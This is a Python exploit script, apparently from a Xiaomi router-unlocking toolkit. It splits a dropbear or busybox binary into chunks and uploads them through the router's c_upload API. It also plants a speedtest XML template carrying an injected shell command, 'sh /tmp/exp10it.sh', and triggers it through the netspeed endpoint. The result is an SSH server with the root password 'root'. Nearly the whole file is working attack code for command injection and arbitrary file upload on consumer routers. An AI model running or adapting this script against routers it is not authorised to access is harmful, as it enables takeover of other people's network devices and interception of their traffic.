#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import hashlib
import requests
import socket
import tarfile

import xmir_base
from gateway import *


gw = create_gateway(ssh_port = 122, die_if_sshOk = True, die_if_ftpOk = False)

dn = gw.device_name

use_ssh = True

dn_tmp = 'tmp/'

if use_ssh:
    dn_dir = 'data/payload_ssh/'
else:
    dn_dir = 'data/payload/'

print("Begin creating a payload for the exploit...")
fn_payload1 = 'tmp/payload1.tar.gz'
fn_payload2 = 'tmp/payload2.tar.gz'
fn_payload3 = 'tmp/payload3.tar.gz'

if use_ssh:
    fn_pfname = 'dropbearmulti'
else:
    fn_pfname = 'busybox'

fn_pf1 = dn_tmp + fn_pfname + '_01'
fn_pf2 = dn_tmp + fn_pfname + '_02'
fn_pf3 = dn_tmp + fn_pfname + '_03'

fn_suffix = '_mips'
if dn == 'R3D' or dn == 'D01':
    fn_suffix = '_armv7a'
if dn == "RB03":
    fn_suffix = '_arm64'

fn_pf = dn_dir + fn_pfname + fn_suffix

os.remove(fn_payload1) if os.path.exists(fn_payload1) else None
os.remove(fn_payload2) if os.path.exists(fn_payload2) else None
os.remove(fn_payload3) if os.path.exists(fn_payload3) else None

with open(fn_pf, "rb") as file:
    pf = file.read()
psize = len(pf) // 3
wsize = psize + 8000
with open(fn_pf1, "wb") as file:
    file.write(pf[:wsize])
pf = pf[wsize:]
wsize = psize - 8000
with open(fn_pf2, "wb") as file:
    file.write(pf[:wsize])
pf = pf[wsize:]
with open(fn_pf3, "wb") as file:
    file.write(pf)

fn_exploit = "exp10it.sh"
command = f"sh /tmp/{fn_exploit}"

fn_executor = "speedtest_urls.xml"
with open(dn_dir + fn_executor, "rt", encoding = "UTF-8") as file:
    template = file.read()

data = template.format(router_ip_address=gw.ip_addr, command=command)
with open(dn_tmp + fn_executor, "wt", encoding = "UTF-8", newline = "\n") as file:
    file.write(data)

with tarfile.open(fn_payload1, "w:gz", compresslevel=9) as tar:
    tar.add(fn_pf1, arcname = os.path.basename(fn_pf1))

with tarfile.open(fn_payload2, "w:gz", compresslevel=9) as tar:
    tar.add(fn_pf2, arcname = os.path.basename(fn_pf2))

with tarfile.open(fn_payload3, "w:gz", compresslevel=9) as tar:
    tar.add(fn_pf3, arcname = os.path.basename(fn_pf3))
    tar.add(dn_tmp + fn_executor, arcname = fn_executor)
    tar.add(dn_dir + fn_exploit, arcname = fn_exploit)
    if use_ssh:
        tar.add(dn_dir + 'dropbear.uci.cfg', arcname = 'dropbear.uci.cfg')
        tar.add(dn_dir + 'dropbear.init.d.sh', arcname = 'dropbear.init.d.sh')

os.remove(fn_pf1) if os.path.exists(fn_pf1) else None
os.remove(fn_pf2) if os.path.exists(fn_pf2) else None
os.remove(fn_pf3) if os.path.exists(fn_pf3) else None

tgz_size1 = os.path.getsize(fn_payload1)
if tgz_size1 > 100*1024 - 128:
    die(f'File size "{fn_payload1}" exceeds 100KiB')

tgz_size2 = os.path.getsize(fn_payload2)
if tgz_size2 > 100*1024 - 128:
    die(f'File size {fn_payload2} exceeds 100KiB')

print("Start uploading the exploit with payload...")

if (fn_payload1):
    requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload1, 'rb')})
if (fn_payload2):
    requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload2, 'rb')})
if (fn_payload3):
    requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})

time.sleep(1)

if use_ssh:
    print(f"Running SSH server on port {gw.ssh_port}...")
    gw.use_ssh = True
else:
    print("Running TELNET and FTP servers...")
    gw.use_ftp = True

requests.get(gw.apiurl + "xqnetdetect/netspeed")

time.sleep(0.5)
gw.passw = 'root'
gw.ping(contimeout = 27)

print("")
print(f"#### Connection to device {gw.device_name} is OK ####")
